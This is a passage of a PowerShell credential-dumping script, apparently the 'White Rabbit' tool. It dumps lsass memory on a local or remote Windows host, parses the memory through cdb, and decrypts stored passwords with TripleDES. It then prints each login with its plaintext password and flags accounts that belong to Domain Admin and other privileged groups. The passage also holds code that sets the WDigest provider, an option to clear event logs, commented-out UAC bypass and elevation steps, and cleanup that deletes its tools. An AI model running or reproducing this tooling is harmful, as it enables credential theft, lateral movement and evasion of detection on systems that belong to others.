        if($mode -eq 1) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}    
        if($mode -eq 232) { $start = 38 + ($toAdd - 4)}
        $j = 0
        $keyAddress = ""
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                if($mode -eq 232) {
                    if($j -eq 4) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                else {
                    if($j -eq 2) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
            }
            $fi = [array]::indexof($ata,"Implicit") + $value
            $keyAddress2 = $ata[$fi].Substring(0,2)
            $keyAddress1 = $ata[$fi].Substring(2,2)           
            $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
            $j++
        }        
        $keyToGet2 = $keyAddress      
        $chain = White-Rabbit4           
        Write-InFile $buffer "$chainProcess;$chain"         
        $iv = Call-MemoryWalker $memoryWalker $file $fullScriptPath                  
        $tab = ($iv -split ' ')        
        if($mode -eq 1 -or $mode -eq 132) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}
        $j = 0
        $iva = ""
        $start = 4 + ($toAdd - 4)
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $fi = [array]::indexof($tab,"Implicit") + $value   
            if($j -eq 7) {
                $iva1 = $tab[$fi].Substring(0,2)
            }
            else {
                $iva1 = $tab[$fi]
            }
            $iva += "$comma"+"0x$iva1"
            $j++
        }   
        $ivHex = $iva         
        $chain = White-RabbitOrWhat
        Write-InFile $buffer "$chainProcess;$chain"         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
        $firstAddress = ""
        $tabf = ($tab -split ' ')  
        if($mode -eq 132 -or $mode -eq 232) {
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd
            $firstAddress1 = $tabf[$fi]
            $firstAddress = "$firstAddress1" 
        }
        else {
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd
            $firstAddress1 = $tabf[$fi]
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd + 1
            $firstAddress2 = $tabf[$fi]    
            $firstAddress = "$firstAddress2$firstAddress1" 
        }    
        $firstAddressList = $firstAddress        
        $nextEntry = ""
        $i = 0
Write-Output "The white rabbit found something...`n"
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress            
                $command = "$chain42 $firstAddress"
            }
            else {            
                $command = "$chain42 $nextEntry"
            }          
            Write-InFile $buffer "$chainProcess;$command"         
            $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
            if($mode -eq 132 -or $mode -eq 232) {
                if($i -eq 0) {
                    $firstAddress = $firstAddress                                                 
                }
                else {        
                    $firstAddress = $nextEntry                         
                }   
                $tab = ($ddSecond -split ' ')   
                $fi = [array]::indexof($tab,"Implicit") + $toAdd
                $nextEntry1 = $tab[$fi]        
                $nextEntry = "$nextEntry1" 
            }
            else {
                if($i -eq 0) {
                    $firstAddress = $firstAddress                                                 
                }
                else {        
                    $firstAddress = $nextEntry                
                } 
                $tab = ($ddSecond -split ' ')    
                $fi = [array]::indexof($tab,"Implicit") + $toAdd
                $nextEntry1 = $tab[$fi]     
                $fi = [array]::indexof($tab,"Implicit") + $toAdd + 1
                $nextEntry2 = $tab[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1" 
            }           
            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1        
            $tab = ($ddSecond -split ' ')          
            if($mode -eq 1) { $start = 48 + ($toAdd - 4)}
            if($mode -eq 132 -or $mode -eq 232) { $start = 17 + ($toAdd - 4) }
            if($mode -eq 2 -or $mode -eq "2r2") { $start = 24 + ($toAdd - 4) }         
            $fi = [array]::indexof($tab,"Implicit") + $start
            $la1 = $tab[$fi] 
            $fi = [array]::indexof($tab,"Implicit") + $start + 1
            $la2 = $tab[$fi]    
            $la = "$la2$la1"                                         
            if($la -eq "0000000000000000"){
                $start = 24
                $fi = [array]::indexof($tab,"Implicit") + $start
                $la1 = $tab[$fi]       
                $fi = [array]::indexof($tab,"Implicit") + $start + 1
                $la2 = $tab[$fi]      
                $la = "$la2$la1"                                                    
            }          
            $tu = White-RabbitOK        
            $chain = "$tu $la"      
            Write-InFile $buffer "$chainProcess;$chain"         
            $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
            $tab = ($loginDB -split ' ')            
            $fi = [array]::indexof($tab,"Implicit") + $toAdd
            $loginPlainText1 = $tab[$fi]
            $loginPlainText = $loginPlainText1 -replace """",""                                     
            if (($global:partOfADomain -eq 1) -and ($adFlag -eq 1)) {
                $user = ""
                if(![string]::IsNullOrEmpty($loginPlainText)) {
	                $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	                if(![string]::IsNullOrEmpty($user)) {
	                    $user = $user.DistinguishedName   
	                    $enterpriseAdminsFlag = "false"
	                    $schemaAdminsFlag = "false"
	                    $domainAdminFlag = "false"
	                    $administratorsFlag = "false"
	                    $backupOperatorsFlag = "false"
	                    if($global:enterpriseAdmins -ne ""){
	                        $enterpriseAdminsFlag = $global:enterpriseAdmins.Contains($user)
	                        if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                    }
	                    if($global:schemaAdmins -ne ""){
	                        $schemaAdminsFlag = $global:schemaAdmins.Contains($user)
	                        if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                    }
	                    $domainAdminFlag = $global:domainAdmins.Contains($user)
	                    if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                    $administratorsFlag = $global:administrators.Contains($user)
	                    if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                    $backupOperatorsFlag = $global:backupOperators.Contains($user)
	                    if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	                }
                }
            }        
            Write-Progress -Activity "Getting valuable informations.." -status "Running..." -id 1         
            $tab = ($ddSecond -split ' ')    
            if($mode -eq 132 -or $mode -eq 232) { $start = 22 + ($toAdd - 4)}
            else {$start = 34 + ($toAdd - 4)}
            $fi = [array]::indexof($tab,"Implicit") + $start
            $lp = $tab[$fi]
            $lp = $lp.Substring(6,2)            
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lp,16)/8) * 4            
            if($mode -eq 132 -or $mode -eq 232) {
                $fi = [array]::indexof($tab,"Implicit") + 23 + ($toAdd - 4)
                $secondAddress1 = $tab[$fi]     
                $secondAddress = "$secondAddress1" 
            }
            else {
                $fi = [array]::indexof($tab,"Implicit") + 36 + ($toAdd - 4)
                $secondAddress1 = $tab[$fi]  
                $fi = [array]::indexof($tab,"Implicit") + 37 + ($toAdd - 4)
                $secondAddress2 = $tab[$fi]    
                $secondAddress = "$secondAddress2$secondAddress1"        
            }        
            $secondAddressCommand = "$chain2 $secondAddress L$numberBytes"  
            Write-InFile $buffer "$chainProcess;$secondAddressCommand"         
            $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
            $tabSplitted = ($tab -split ' ')                  
            $pa11 = ""
            $pa2 = ""
            $j = 1
            $modJ = $j
            $begin = 4 + ($toAdd - 4)
            $stringP = ""
            while($j -le $numberBytes) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) {
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $fi = [array]::indexof($tabSplitted,"Implicit") + $value                
                $pa2 = $tabSplitted[$fi].Substring(0,2)
                $pa1 = $tabSplitted[$fi].Substring(2,2)            
                $stringP += "$comma"+"0x$pa1, 0x$pa2"
                $j++
                $modJ++
            }        
            $pHex = $stringP                            
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText" 
            Write-Output "----------------------------------`nLogin : $loginPlainText"          
            if(($numberBytes % 8)) {        
                #$password = Get-DecryptAESPassword $pHex $keyToGet2 $ivHex
                $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
            }
            else {        
                $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
            }        
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
	    if($password) {
            if(($loginPlainText[-1]) -ne '$'){
                $password = [System.Text.UnicodeEncoding]::Unicode.GetString($password )
                #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
                #Write-Output "Password : $password"
                Write-Output "`n$loginPlainText [===] $password"
            }    
        }
            $i++
        }
    }
    <#
    else {    
        Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
    } #>     
}

function Get-KernelInformations ($buffer, $fullScriptPath) {       
    $toAdd = 11
    $chainProcess = ""    
    $chain = White-RabbitContext    
    Write-InFile $buffer $chain    
    $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols
    $tabFA = ($tab -split ' ')         
    $fi = [array]::indexof($tabFA,"PROCESS") + 1
    $value = $tabFA[$fi]
    $chainProcess = ".process /r /p $value" 
    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232") {       
        $chain = White-Rabbit1    
        Write-InFile $buffer "$chainProcess;$chain"
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols               
        $chain42 = White-Rabbit42
        $tabFA = ($tab -split ' ')              
        $fi = [array]::indexof($tabFA,"Implicit") + $toAdd      
        $part1 = $tabFA[$fi]    
        $fi = [array]::indexof($tabFA,"Implicit") + $toAdd + 1
        $part2 = $tabFA[$fi]    
        $final = "$part2$part1"            
        $chain = "$chain42 $final"                     
        Write-InFile $buffer "$chainProcess;$chain"     
        $chain2 = White-Rabbit2  
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols               
        $sa = Clean-String $tab $mode "kernel"
        $command = "$chain2 $sa"            
        Write-InFile $buffer "$chainProcess;$command" 
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols                      
        $tabSplitted = ($tab -split ' ')                 
        if($mode -eq 1) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}
        if($mode -eq "2r2") { $start = 40 + ($toAdd - 4)}    
        if($mode -eq "232") { $start = 38 + ($toAdd - 4)}    
        $j = 0
        $keyAddress = ""
        while($j -le 11) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else { 
                if($mode -eq 232) {
                    if($j -eq 4) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                else {
                    if($j -eq 2 -or $j -eq 10) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
            }        
            $fi = [array]::indexof($tabSplitted,"Implicit") + $value
            $keyAddress2 = $tabSplitted[$fi].Substring(0,2)
            $keyAddress1 = $tabSplitted[$fi].Substring(2,2)           
            $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
            $j++
        }        
        $keyToGet = $keyAddress                 
        $chain = White-Rabbit3
        Write-InFile $buffer "$chainProcess;$chain"    
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols               
        $tabf = ($tab -split ' ')    
        $fi = [array]::indexof($tabf,"Implicit") + $toAdd
        $firstAddress1 = $tabf[$fi]    
        $fi = [array]::indexof($tabf,"Implicit") + $toAdd + 1
        $firstAddress2 = $tabf[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"            
        $chain = "$chain42 $firstAddress"         
        Write-InFile $buffer "$chainProcess;$chain"
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols      
        $arraySecondAddress = ($tab -split ' ')  
        if($mode -eq 232) { 
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 7 + ($toAdd - 4)
            $secondAddress = $arraySecondAddress[$fi]    
        }
        else {
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 10 + ($toAdd - 4)
            $secondAddress1 = $arraySecondAddress[$fi]    
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 11 + ($toAdd - 4)
            $secondAddress2 = $arraySecondAddress[$fi]    
            $secondAddress = "$secondAddress2$secondAddress1"  
        }             
        $chain = "$chain2 $secondAddress" 
        Write-InFile $buffer "$chainProcess;$chain"         
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols      
        $ata = ($tab -split ' ')     
        if($mode -eq 1) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}    
        if($mode -eq 232) { $start = 38 + ($toAdd - 4)}
        $j = 0
        $keyAddress = ""
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                if($mode -eq 232) {
                    if($j -eq 4) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                else {
                    if($j -eq 2) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
            }
            $fi = [array]::indexof($ata,"Implicit") + $value
            $keyAddress2 = $ata[$fi].Substring(0,2)
            $keyAddress1 = $ata[$fi].Substring(2,2)           
            $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
            $j++
        }        
        $keyToGet2 = $keyAddress              
        $chain = White-Rabbit4           
        Write-InFile $buffer "$chainProcess;$chain"         
        $iv = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols                   
        $tab = ($iv -split ' ')        
        if($mode -eq 1 -or $mode -eq 132) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}
        $j = 0
        $iva = ""
        $start = 4 + ($toAdd - 4)
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $fi = [array]::indexof($tab,"Implicit") + $value   
            if($j -eq 7) {
                $iva1 = $tab[$fi].Substring(0,2)
            }
            else {
                $iva1 = $tab[$fi]
            }
            $iva += "$comma"+"0x$iva1"
            $j++
        }   
        $ivHex = $iva         
        $chain = White-RabbitOrWhat
        Write-InFile $buffer "$chainProcess;$chain"         
        $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols    
        $firstAddress = ""
        $tabf = ($tab -split ' ')  
        if($mode -eq 132 -or $mode -eq 232) {
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd
            $firstAddress1 = $tabf[$fi]
            $firstAddress = "$firstAddress1" 
        }
        else {
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd
            $firstAddress1 = $tabf[$fi]
            $fi = [array]::indexof($tabf,"Implicit") + $toAdd + 1
            $firstAddress2 = $tabf[$fi]    
            $firstAddress = "$firstAddress2$firstAddress1" 
        }    
        $firstAddressList = $firstAddress        
        $nextEntry = ""
        $i = 0
Write-Output "The white rabbit found something...`n"
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress            
                $command = "$chain42 $firstAddress"
            }
            else {            
                $command = "$chain42 $nextEntry"
            }          
            Write-InFile $buffer "$chainProcess;$command"         
            $ddSecond = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols       
            if($mode -eq 132 -or $mode -eq 232) {
                if($i -eq 0) {
                    $firstAddress = $firstAddress                                                 
                }
                else {        
                    $firstAddress = $nextEntry                         
                }   
                $tab = ($ddSecond -split ' ')   
                $fi = [array]::indexof($tab,"Implicit") + $toAdd
                $nextEntry1 = $tab[$fi]        
                $nextEntry = "$nextEntry1" 
            }
            else {
                if($i -eq 0) {
                    $firstAddress = $firstAddress                                                 
                }
                else {        
                    $firstAddress = $nextEntry                
                } 
                $tab = ($ddSecond -split ' ')    
                $fi = [array]::indexof($tab,"Implicit") + $toAdd
                $nextEntry1 = $tab[$fi]     
                $fi = [array]::indexof($tab,"Implicit") + $toAdd + 1
                $nextEntry2 = $tab[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1" 
            }           
            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1        
            $tab = ($ddSecond -split ' ')          
            if($mode -eq 1) { $start = 48 + ($toAdd - 4)}
            if($mode -eq 132 -or $mode -eq 232) { $start = 17 + ($toAdd - 4) }
            if($mode -eq 2 -or $mode -eq "2r2") { $start = 24 + ($toAdd - 4) }         
            $fi = [array]::indexof($tab,"Implicit") + $start
            $la1 = $tab[$fi] 
            $fi = [array]::indexof($tab,"Implicit") + $start + 1
            $la2 = $tab[$fi]    
            $la = "$la2$la1"                                         
            if($la -eq "0000000000000000"){
                $start = 24
                $fi = [array]::indexof($tab,"Implicit") + $start
                $la1 = $tab[$fi]       
                $fi = [array]::indexof($tab,"Implicit") + $start + 1
                $la2 = $tab[$fi]      
                $la = "$la2$la1"                                                    
            }          
            $tu = White-RabbitOK        
            $chain = "$tu $la"      
            Write-InFile $buffer "$chainProcess;$chain"         
            $loginDB = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols       
            $tab = ($loginDB -split ' ')            
            $fi = [array]::indexof($tab,"Implicit") + $toAdd
            $loginPlainText1 = $tab[$fi]
            $loginPlainText = $loginPlainText1 -replace """",""                                     
            if (($global:partOfADomain -eq 1) -and ($adFlag -eq 1)) {
                $user = ""
                if(![string]::IsNullOrEmpty($loginPlainText)) {
	                $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	                if(![string]::IsNullOrEmpty($user)) {
	                    $user = $user.DistinguishedName   
	                    $enterpriseAdminsFlag = "false"
	                    $schemaAdminsFlag = "false"
	                    $domainAdminFlag = "false"
	                    $administratorsFlag = "false"
	                    $backupOperatorsFlag = "false"
	                    if($global:enterpriseAdmins -ne ""){
	                        $enterpriseAdminsFlag = $global:enterpriseAdmins.Contains($user)
	                        if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                    }
	                    if($global:schemaAdmins -ne ""){
	                        $schemaAdminsFlag = $global:schemaAdmins.Contains($user)
	                        if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                    }
	                    $domainAdminFlag = $global:domainAdmins.Contains($user)
	                    if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                    $administratorsFlag = $global:administrators.Contains($user)
	                    if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                    $backupOperatorsFlag = $global:backupOperators.Contains($user)
	                    if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	                }
                }
            }        
            Write-Progress -Activity "Getting valuable informations.." -status "Running..." -id 1         
            $tab = ($ddSecond -split ' ')    
            if($mode -eq 132 -or $mode -eq 232) { $start = 22 + ($toAdd - 4)}
            else {$start = 34 + ($toAdd - 4)}
            $fi = [array]::indexof($tab,"Implicit") + $start
            $lp = $tab[$fi]
            $lp = $lp.Substring(6,2)            
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lp,16)/8) * 4            
            if($mode -eq 132 -or $mode -eq 232) {
                $fi = [array]::indexof($tab,"Implicit") + 23 + ($toAdd - 4)
                $secondAddress1 = $tab[$fi]     
                $secondAddress = "$secondAddress1" 
            }
            else {
                $fi = [array]::indexof($tab,"Implicit") + 36 + ($toAdd - 4)
                $secondAddress1 = $tab[$fi]  
                $fi = [array]::indexof($tab,"Implicit") + 37 + ($toAdd - 4)
                $secondAddress2 = $tab[$fi]    
                $secondAddress = "$secondAddress2$secondAddress1"        
            }        
            $secondAddressCommand = "$chain2 $secondAddress L$numberBytes"  
            Write-InFile $buffer "$chainProcess;$secondAddressCommand"         
            $tab = Call-MemoryKernelWalker $MemoryKernelWalker $file $fullScriptPath $symbols                                  
            $tabSplitted = ($tab -split ' ')                  
            $pa11 = ""
            $pa2 = ""
            $j = 1
            $modJ = $j
            $begin = 4 + ($toAdd - 4)
            $stringP = ""
            while($j -le $numberBytes) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) {
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $fi = [array]::indexof($tabSplitted,"Implicit") + $value                
                $pa2 = $tabSplitted[$fi].Substring(0,2)
                $pa1 = $tabSplitted[$fi].Substring(2,2)            
                $stringP += "$comma"+"0x$pa1, 0x$pa2"
                $j++
                $modJ++
            }        
            $pHex = $stringP                                   
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"           
#Write-Output "----------------------------------`nLogin : $loginPlainText`n" 
            if(($numberBytes % 8)) {        
                #$password = Get-DecryptAESPassword $pHex $keyToGet2 $ivHex
                $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
            }
            else {        
                $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
            }        
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
	    if($password) {
            if(($loginPlainText[-1]) -ne '$'){
                $password = [System.Text.UnicodeEncoding]::Unicode.GetString($password )
                #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
                #Write-Output "Password : $password"
                Write-Output "`n$loginPlainText [===] $password"
            }    
        } 
            $i++
        }
    }
    <#
    else {    
        Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
    } #>     
}

#----------------------------------------------------------[Execution]----------------------------------------------------------

#Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
Write-Output "================================================================================================`n"
White-Rabbit
$white = "IFwNCiAgXCAvXCAgIEZvbGxvdyB0aGUgd2hpdGUgUmFiYml0IDotKQ0KICAoICkgICAgICAgQHBhYnJhZWtlbg0KLiggQCApLiANCg=="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($white))

# Prerequis
Test-InternetConnection

<#
if($relaunched -eq 0) {
<#
    if(!(Test-IsInLocalAdministratorsGroup)) {
        $elevate = 1    
        Bypass-UAC $scriptPath $logDirectoryPath
    }
    else {  
$adminFlag = Test-LocalAdminRights
if($adminFlag -eq $false){        
    #Write-Log -streamWriter $global:streamWriter -infoToLog "You have to launch this script with local Administrator rights!"
    $scriptPath = Split-Path $MyInvocation.InvocationName   
    $RWMC = $scriptPath + "\White-Rabbit.ps1 1"     
    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;        
    Stop-Script
}    
    #}
}
#>

switch ($QueryAD){
    "1" {$adFlag = 1}
    "2" {$adFlag = 0}
    "Yes" {$adFlag = 1}
    "No" {$adFlag = 0}
    "Y" {$adFlag = 1}
    "N" {$adFlag = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Active Directory cmdlets will be not used";$adFlag = "0"}
}

switch ($Target){
    "1" {$dump = "gen"}
    "2" {$dump = "remote"}
    "3" {$dump = "dump"}
    "4" {$dump = "snapshot"}
    "0" {Stop-Script}
    "m" {cls;White-MakeMeASandwich;Stop-Script}
    default {Write-Output "The option could not be determined... generate local dump"}
}

Set-ActiveDirectoryInformations $adFlag

if($dump -eq "dump" -or $dump -eq "snapshot") {
    if($dump -eq "dump") {
        $dump = $ProcessPath
    }
    else {
        if($dump -eq "snapshot") {
            $snapshot = $true
            $dump = $SnapshotVMPath
        }
    }
    $mode = Read-Host 'Mode (3 (Windows 2003), 1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 2016 (Windows Server 2016))?'
    switch ($Mode){
        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
        "232" {Write-Output "Try to reveal password for Windows 10 32 bits"}
        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
        "2016" {Write-Output "Try to reveal password for Windows 2016"}
        default {
            Write-Output "The mode could not be determined... terminating"
            Stop-Script
        }
    }
}
else {
    if($dump -eq "remote") { 
        $dump = ""
        if($ComputerName -ne "not") {
            $server = $ComputerName
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture

            $operatingSystemHost = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitectureHost =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

            $hostMode = Get-OperatingSystemMode $operatingSystemHost $osArchitectureHost
        }
        else {
            Write-Output "You have to enter the -ComputerName parameter"
            Stop-Script
        }
    }
    else {
        if($dump -eq "gen") { 
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        }
    }
    $mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
}

switch ($clearEventLog){
    "1" {$clearEventLog = 1}
    "2" {$clearEventLog = 0}
    "Yes" {$clearEventLog = 1}
    "No" {$clearEventLog = 0}
    "Y" {$clearEventLog = 1}
    "N" {$clearEventLog = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Cleaning of Event Logs will be not used";$clearEventLog = "0"}
}

if($clearEventLog -eq 1) {
     Stop-Activities
}

if($hostMode -ne "") {
    $modeSave = $mode
    $mode = $hostMode
}
$modeRemoveFile = ""
if($mode -eq "2r2" -or $mode -eq "232" -or $mode -eq "2016" -or $mode -eq "8.1") {
    if($mode -eq "2r2") {
        if($snapshot -eq $true) {
	    Set-Upload -Mode "2r2vm"
	    $modeRemoveFile = "2r2vm"
            $memoryWalker = "$windowsSecurity\cdb.exe"
        }
        else {	    
	    Set-Upload -Mode "2r2"
	    $modeRemoveFile = "2r2"
            $memoryWalker = "$windowsSecurity\cdb.exe"
        }
    }
    else {
        if($snapshot -eq $true) {
	    Set-Upload -Mode "pre2r2vm"
	    $modeRemoveFile = "pre2r2vm"
            $memoryWalker = "$windowsSecurity\cdb.exe"
        }
        else {
            if($mode -eq "2016"){
		Set-Upload -Mode "pre2r2vm"
		$modeRemoveFile = "pre2r2vm"
                $memoryWalker = "$windowsSecurity\cdb.exe"
            }
            else {
                if($operatingSystem -eq "10.0.10240") {
		    Set-Upload -Mode "2r2"
		$modeRemoveFile = "2r2"
                    $memoryWalker = "$windowsSecurity\cdb.exe"
                }
                else {
		    Set-Upload -Mode "pre2r2"
		    $modeRemoveFile = "pre2r2"
                    $memoryWalker = "$windowsSecurity\cdb.exe"
                }
            }
        }
    }

    if($dump -eq "gen") {
        Set-WdigestProvider
    }
    else {
        if($dump -eq "" -and (![string]::IsNullOrEmpty($server))){
            Set-RemoteWdigestProvider $server
        }
    }
}
else {
    if($snapshot -eq $true) {
	Set-Upload -Mode "pre2r2vm"
	$modeRemoveFile = "pre2r2vm"
        $memoryWalker = "$scriptPath\cdb.exe"
    }
    else {
	Set-Upload -Mode "pre2r2"
	$modeRemoveFile = "pre2r2"
        $memoryWalker = "$scriptPath\cdb.exe"
    }
}

if($hostMode -ne "") {
    $mode = $modeSave
}
Set-SymbolServer -CacheDirectory "$windowsSecurity\symbols\public" -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
if($dump -eq "gen"){
    if($mode -eq "2r2") {
        $dumpAProcessPath = "$scriptPath\msdsc.exe"
        &$dumpAProcessPath "lsass" "$logDirectoryPath"
    }
    else {
        if($elevate -eq 0) {
            $process = Get-Process lsass 
            Write-Minidump $process $logDirectoryPath                
        }
    }
}
else {
    if($dump -eq ""){
        $computername = $server        
        Remote-Dumping $computername $scriptPath $logDirectoryPath        
    }
    else {
        $file = $dump
    }
}

if($snapshot -eq $false) {
    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "8.1" -or $mode -eq "232" -or $mode -eq "2016") {     
        Get-SupportedSystemsInformations $buffer $fullScriptPath    
#Write-Log -streamWriter $global:streamWriter -infoToLog $fullScriptPath            
    }
    else {        
        Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
    }
}
else {
    Get-VMSnapshotInformations $buffer $fullScriptPath         
}
Remove-Item -Recurse -Force "$windowsSecurity\symbols"
Remove-Item -Recurse -Force  $logDirectoryPath
Remove-Item "$scriptPath\bufferCommand.txt"
$files = ""
Switch ($modeRemoveFile) {
	    "2r2" {
    		    $files = "$windowsSecurity\SymbolCheck.dll","$windowsSecurity\cdb.exe","$windowsSecurity\dbghelp.dll","$windowsSecurity\symsrv.dll"
	    }
	    "pre2r2" {
    		    $files = "$windowsSecurity\SymbolCheck.dll","$windowsSecurity\cdb.exe","$windowsSecurity\dbghelp.dll","$windowsSecurity\symsrv.dll"
	    }
	    "pre2r2vm" {
